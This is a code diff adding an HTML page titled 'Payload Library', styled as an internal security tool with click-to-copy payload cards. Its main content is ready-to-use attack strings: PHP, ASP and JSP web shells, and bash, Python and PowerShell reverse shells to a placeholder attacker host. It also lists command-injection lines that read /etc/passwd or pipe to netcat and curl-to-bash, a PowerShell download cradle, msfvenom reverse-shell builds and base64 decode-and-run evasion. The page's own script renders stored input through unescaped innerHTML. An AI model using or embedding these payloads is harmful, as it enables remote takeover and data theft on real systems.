@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Library - Internal Security Tool</title>
+    <style>
+        :root {
+            --bg: #0a0f1c;
+            --card: #131a2a;
+            --accent: #06b6d4;
+            --muted: #8b9bb5;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --success: #10b981;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: #e6eef3;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .logo {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, var(--accent), #22c1c3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            color: #022;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: var(--muted);
+            font-size: 14px;
+        }
+        
+        .warning-banner {
+            background: var(--warning);
+            color: #000;
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .search-box {
+            background: var(--card);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        
+        .search-box input {
+            flex: 1;
+            padding: 10px 15px;
+            border-radius: 6px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.3);
+            color: white;
+            font-size: 14px;
+        }
+        
+        .search-box button {
+            padding: 10px 15px;
+            border-radius: 6px;
+            border: none;
+            background: var(--accent);
+            color: #022;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        
+        .payload-category {
+            background: var(--card);
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .category-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .category-icon {
+            font-size: 20px;
+        }
+        
+        .category-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .payload-item {
+            background: rgba(0,0,0,0.2);
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+        }
+        
+        .payload-item:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+        }
+        
+        .payload-name {
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .copy-badge {
+            background: var(--accent);
+            color: #022;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        
+        .payload-code {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--muted);
+            white-space: pre-wrap;
+            word-break: break-all;
+            background: rgba(0,0,0,0.3);
+            padding: 8px;
+            border-radius: 4px;
+            margin-top: 5px;
+        }
+        
+        .custom-payloads {
+            margin-top: 30px;
+        }
+        
+        .custom-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .btn {
+            padding: 8px 15px;
+            border-radius: 6px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-primary {
+            background: var(--accent);
+            color: #022;
+        }
+        
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            color: white;
+        }
+        
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            color: var(--muted);
+            font-size: 12px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: var(--card);
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+        }
+        
+        .modal h3 {
+            margin-bottom: 15px;
+        }
+        
+        .modal input, .modal textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.3);
+            color: white;
+        }
+        
+        .modal textarea {
+            min-height: 100px;
+            font-family: monospace;
+        }
+        
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            border-radius: 6px;
+            background: var(--success);
+            color: white;
+            font-weight: 600;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 1001;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="logo.png" style="width: 100px; height: 100px;" alt="">
+            <div class="logo">PL</div>
+            <div>
+                <h1>Payload Library</h1>
+                <div class="subtitle">Internal Security Tool - Authorized Use Only</div>
+            </div>
+        </header>
+        
+        <div class="warning-banner">
+            ⚠️ INTERNAL USE ONLY - These payloads are for authorized testing only. Use responsibly in controlled environments.
+        </div>
+        
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Search payloads...">
+            <button id="searchBtn">Search</button>
+        </div>
+        
+        <div class="payload-grid" id="payloadGrid">
+            <!-- Web Shells -->
+            <div class="payload-category">
+                <div class="category-header">
+                    <div class="category-icon">🔐</div>
+                    <div class="category-title">Web Shells</div>
+                </div>
+                
+                <div class="payload-item" data-payload="<?php system($_GET['cmd']); ?>">
+                    <div class="payload-name">
+                        PHP Web Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code"><?php system($_GET['cmd']); ?></div>
+                </div>
+                
+                <div class="payload-item" data-payload="<% eval(Request(&quot;cmd&quot;)) %>">
+                    <div class="payload-name">
+                        ASP Web Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code"><% eval(Request("cmd")) %></div>
+                </div>
+                
+                <div class="payload-item" data-payload="<% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %>">
+                    <div class="payload-name">
+                        JSP Web Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code"><% Runtime.getRuntime().exec(request.getParameter("cmd")); %></div>
+                </div>
+            </div>
+            
+            <!-- Reverse Shells -->
+            <div class="payload-category">
+                <div class="category-header">
+                    <div class="category-icon">🔄</div>
+                    <div class="category-title">Reverse Shells</div>
+                </div>
+                
+                <div class="payload-item" data-payload="bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1">
+                    <div class="payload-name">
+                        Bash Reverse Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</div>
+                </div>
+                
+                <div class="payload-item" data-payload="python -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;ATTACKER_IP&quot;,PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'">
+                    <div class="payload-name">
+                        Python Reverse Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>
+                </div>
+                
+                <div class="payload-item" data-payload="powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;">
+                    <div class="payload-name">
+                        PowerShell Reverse Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</div>
+                </div>
+            </div>
+            
+            <!-- Command Injection -->
+            <div class="payload-category">
+                <div class="category-header">
+                    <div class="category-icon">⚡</div>
+                    <div class="category-title">Command Injection</div>
+                </div>
+                
+                <div class="payload-item" data-payload="; cat /etc/passwd">
+                    <div class="payload-name">
+                        Basic Command Injection
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">; cat /etc/passwd</div>
+                </div>
+                
+                <div class="payload-item" data-payload="| nc ATTACKER_IP PORT -e /bin/sh">
+                    <div class="payload-name">
+                        Pipe to Netcat
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">| nc ATTACKER_IP PORT -e /bin/sh</div>
+                </div>
+                
+                <div class="payload-item" data-payload="&& curl http://ATTACKER_IP/shell.sh | bash">
+                    <div class="payload-name">
+                        Download and Execute
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">&& curl http://ATTACKER_IP/shell.sh | bash</div>
+                </div>
+            </div>
+            
+            <!-- Script Payloads -->
+            <div class="payload-category">
+                <div class="category-header">
+                    <div class="category-icon">📜</div>
+                    <div class="category-title">Script Payloads</div>
+                </div>
+                
+                <div class="payload-item" data-payload="&lt;?php eval($_POST['cmd']); ?&gt;">
+                    <div class="payload-name">
+                        PHP Eval Shell
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">&lt;?php eval($_POST['cmd']); ?&gt;</div>
+                </div>
+                
+                <div class="payload-item" data-payload="IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')">
+                    <div class="payload-name">
+                        PowerShell Download Cradle
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')</div>
+                </div>
+            </div>
+            
+            <!-- Exploit Framework -->
+            <div class="payload-category">
+                <div class="category-header">
+                    <div class="category-icon">🔧</div>
+                    <div class="category-title">Exploit Framework</div>
+                </div>
+                
+                <div class="payload-item" data-payload="msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe">
+                    <div class="payload-name">
+                        Metasploit Windows Payload
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe</div>
+                </div>
+                
+                <div class="payload-item" data-payload="msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf">
+                    <div class="payload-name">
+                        Metasploit Linux Payload
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf</div>
+                </div>
+            </div>
+            
+            <!-- Defense Evasion -->
+            <div class="payload-category">
+                <div class="category-header">
+                    <div class="category-icon">🛡️</div>
+                    <div class="category-title">Defense Evasion</div>
+                </div>
+                
+                <div class="payload-item" data-payload="echo &quot;payload&quot; | base64 -d | bash">
+                    <div class="payload-name">
+                        Base64 Encoded
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">echo "payload" | base64 -d | bash</div>
+                </div>
+                
+                <div class="payload-item" data-payload="python -c &quot;exec(__import__('base64').b64decode('cGF5bG9hZA=='))&quot;">
+                    <div class="payload-name">
+                        Python Base64 Decode
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">python -c "exec(__import__('base64').b64decode('cGF5bG9hZA=='))"</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="custom-payloads">
+            <div class="custom-header">
+                <h2>Custom Payloads</h2>
+                <button class="btn btn-primary" id="addCustomBtn">Add Custom Payload</button>
+            </div>
+            <div id="customPayloadsList">
+                <!-- Custom payloads will be added here -->
+            </div>
+        </div>
+        
+        <footer>
+            Internal Security Tool • Authorized Use Only • Keep secure
+        </footer>
+    </div>
+    
+    <!-- Add Custom Payload Modal -->
+    <div class="modal" id="customModal">
+        <div class="modal-content">
+            <h3>Add Custom Payload</h3>
+            <input type="text" id="payloadName" placeholder="Payload Name">
+            <textarea id="payloadCode" placeholder="Payload Code"></textarea>
+            <div class="modal-actions">
+                <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
+                <button class="btn btn-primary" id="savePayloadBtn">Save Payload</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification">Payload copied to clipboard!</div>
+    
+    <script>
+        // Payload data
+        let customPayloads = JSON.parse(localStorage.getItem('customPayloads')) || [];
+        
+        // DOM elements
+        const payloadGrid = document.getElementById('payloadGrid');
+        const customPayloadsList = document.getElementById('customPayloadsList');
+        const searchInput = document.getElementById('searchInput');
+        const searchBtn = document.getElementById('searchBtn');
+        const addCustomBtn = document.getElementById('addCustomBtn');
+        const customModal = document.getElementById('customModal');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const savePayloadBtn = document.getElementById('savePayloadBtn');
+        const payloadName = document.getElementById('payloadName');
+        const payloadCode = document.getElementById('payloadCode');
+        const notification = document.getElementById('notification');
+        
+        // Initialize custom payloads
+        function renderCustomPayloads() {
+            customPayloadsList.innerHTML = '';
+            
+            if (customPayloads.length === 0) {
+                customPayloadsList.innerHTML = '<p style="color: var(--muted); text-align: center; padding: 20px;">No custom payloads added yet.</p>';
+                return;
+            }
+            
+            customPayloads.forEach((payload, index) => {
+                const payloadElement = document.createElement('div');
+                payloadElement.className = 'payload-item';
+                payloadElement.setAttribute('data-payload', payload.code);
+                payloadElement.innerHTML = `
+                    <div class="payload-name">
+                        ${payload.name}
+                        <span class="copy-badge">COPY</span>
+                    </div>
+                    <div class="payload-code">${payload.code}</div>
+                    <button class="btn btn-secondary" style="margin-top: 8px; font-size: 12px; padding: 4px 8px;" data-index="${index}">Delete</button>
+                `;
+                
+                customPayloadsList.appendChild(payloadElement);
+                
+                // Add click event to delete button
+                const deleteBtn = payloadElement.querySelector('button');
+                deleteBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    const index = parseInt(deleteBtn.getAttribute('data-index'));
+                    customPayloads.splice(index, 1);
+                    localStorage.setItem('customPayloads', JSON.stringify(customPayloads));
+                    renderCustomPayloads();
+                });
+            });
+        }
+        
+        // Copy payload to clipboard
+        function copyToClipboard(text) {
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => {
+                    showNotification('Payload copied to clipboard!');
+                });
+            } else {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showNotification('Payload copied to clipboard!');
+            }
+        }
+        
+        // Show notification
+        function showNotification(message) {
+            notification.textContent = message;
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 2000);
+        }
+        
+        // Search functionality
+        function searchPayloads() {
+            const searchTerm = searchInput.value.toLowerCase();
+            const payloadItems = document.querySelectorAll('.payload-item');
+            
+            payloadItems.forEach(item => {
+                const payloadName = item.querySelector('.payload-name').textContent.toLowerCase();
+                const payloadCode = item.querySelector('.payload-code').textContent.toLowerCase();
+                
+                if (payloadName.includes(searchTerm) || payloadCode.includes(searchTerm)) {
+                    item.style.display = 'block';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+        
+        // Event listeners
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('.payload-item')) {
+                const payloadItem = e.target.closest('.payload-item');
+                const payload = payloadItem.getAttribute('data-payload');
+                copyToClipboard(payload);
+            }
+        });
+        
+        searchBtn.addEventListener('click', searchPayloads);
+        searchInput.addEventListener('input', searchPayloads);
+        
+        addCustomBtn.addEventListener('click', () => {
+            customModal.style.display = 'flex';
+        });
+        
+        cancelBtn.addEventListener('click', () => {
+            customModal.style.display = 'none';
+            payloadName.value = '';
+            payloadCode.value = '';
+        });
+        
+        savePayloadBtn.addEventListener('click', () => {
+            const name = payloadName.value.trim();
+            const code = payloadCode.value.trim();
+            
+            if (name && code) {
+                customPayloads.push({ name, code });
+                localStorage.setItem('customPayloads', JSON.stringify(customPayloads));
+                renderCustomPayloads();
+                customModal.style.display = 'none';
+                payloadName.value = '';
+                payloadCode.value = '';
+                showNotification('Custom payload added!');
+            } else {
+                alert('Please enter both a name and code for the payload.');
+            }
+        });
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === customModal) {
+                customModal.style.display = 'none';
+            }
+        });
+        
+        // Initialize
+        renderCustomPayloads();
+    </script>
+</body>
+</html>
